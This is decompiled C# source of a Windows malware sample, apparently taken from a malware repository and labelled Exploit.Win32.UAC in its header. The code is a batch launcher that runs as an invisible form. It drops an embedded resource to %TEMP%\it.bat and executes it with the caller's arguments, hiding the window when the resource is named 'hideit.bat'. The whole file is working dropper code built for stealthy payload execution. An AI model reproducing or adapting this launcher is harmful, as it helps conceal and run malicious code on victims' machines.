// Decompiled with JetBrains decompiler
// Type: BatLauncher.Form1
// Assembly: 33, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 22FAEFFC-4A1D-46A4-984E-961F6AF41A2D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\Exploit.Win32.UAC.igh-494e50277e9added0f90ee0791c2ac21c54c18ab0b0b9820c66fa7cf437497ce.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace BatLauncher
{
  internal class Form1 : Form
  {
    private IContainer components;
    private bool hide;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1, 1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public Form1(string[] args)
    {
      this.InitializeComponent();
      this.Visible = false;
      this.extract();
      this.start(args);
    }

    private string buildargument(string[] args)
    {
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < args.Length; ++index)
        stringBuilder.Append(args[index] + " ");
      return stringBuilder.ToString();
    }

    private void extract()
    {
      string manifestResourceName = Assembly.GetExecutingAssembly().GetManifestResourceNames()[0];
      this.hide = manifestResourceName.EndsWith("hideit.bat");
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(manifestResourceName);
      BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
      FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\it.bat", FileMode.Create);
      byte[] buffer = new byte[manifestResourceStream.Length];
      manifestResourceStream.Read(buffer, 0, buffer.Length);
      fileStream.Write(buffer, 0, buffer.Length);
      binaryReader.Close();
      fileStream.Close();
    }

    private void start(string[] args)
    {
      ProcessStartInfo processStartInfo = new ProcessStartInfo();
      processStartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\it.bat";
      processStartInfo.Arguments = this.buildargument(args);
      processStartInfo.CreateNoWindow = this.hide;
      if (this.hide)
        processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      processStartInfo.WorkingDirectory = Application.StartupPath;
      new Process() { StartInfo = processStartInfo }.Start();
    }

    private void Form1_Load(object sender, EventArgs e) => Application.Exit();
  }
}
